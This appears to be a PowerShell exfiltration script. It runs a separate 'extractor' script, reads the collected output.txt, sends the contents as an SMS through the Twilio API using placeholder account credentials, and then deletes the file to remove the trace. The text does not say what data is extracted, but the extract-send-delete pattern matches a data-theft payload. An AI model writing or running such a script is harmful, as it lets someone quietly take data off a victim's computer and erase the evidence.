./extractor.ps1

$context = Get-Content -Path .\output.txt -Raw

$url = "https://api.twilio.com/2010-04-01/Accounts/[accountid]/Messages.json"
$params = @{
  To = "[mynumber]"
  From = "[secret]"
  Body = $context
}
$secret = "[api key]" |
ConvertTo-SecureString -asPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential("[accountid]", $secret)
Invoke-WebRequest $url -Method Post -Credential $credential -Body $params -UseBasicParsing | Out-Null

# delete output.txt
Remove-Item .\output.txt